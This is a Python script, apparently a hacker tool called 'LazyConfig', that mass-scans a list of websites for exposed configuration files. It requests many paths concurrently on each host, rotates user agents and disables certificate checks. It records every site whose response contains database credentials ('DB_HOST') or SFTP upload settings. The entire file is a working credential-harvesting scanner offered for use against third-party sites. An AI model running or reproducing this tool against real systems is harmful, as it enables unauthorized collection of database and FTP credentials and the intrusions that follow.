import requests
import sys
import re
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from termcolor import colored
import random

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

print("==============================================")
print(colored("   LazyConfig (By Haxor1337)        ", 'green'))
print(colored(" >> https://github.com/haxor1337x/ <<      ", 'green'))
print("==============================================")

path_file = input("Give List Your Path (Ready Path At Folder Path): ")
with open(path_file, "r") as f:
    paths = f.readlines()

listpath = input("Give List Your List: ")
try:
    with open(listpath, "r", encoding="utf-8") as f:
        op = ["http://" + i.strip() for i in f.readlines()]
except UnicodeDecodeError:
    print("Error: Unable to decode file using UTF-8 encoding.")
    sys.exit(1)

pool_size = int(input("Enter the pool size (number of concurrent requests to make): "))

def check(site, headers):
    for path in paths:
        try:
            r = requests.get(site + path.strip(), verify=False, timeout=10, headers=headers)
            if 'DB_HOST' in r.text:
                print(colored(f"[Found Config] ->  {site}", 'green'))
                with open("output/configfound.txt", "a+") as ff:
                    ff.write(f"{site}{path.strip()}\n")
            elif 'save_before_upload' in r.text or 'uploadOnSave' in r.text:
                print(colored(f"[Found FTP] -> {site}", 'green'))
                with open("output/sftpfound.txt", "a+") as ff:
                    ff.write(f"{site}{path.strip()}\n")
            else:
                print(colored(f"[Not Found] -> {site}{path.strip()}", 'red'))
        except Exception as e:
            print(colored(f"[Unknown Error] -> {site}{path.strip()}", 'yellow'))

with open('user-agent.txt', 'r') as f:
    user_agents = [line.strip() for line in f]

with Pool(pool_size) as tod:
    tod.starmap(check, [(site, {'User-Agent': random.choice(user_agents)}) for site in op])
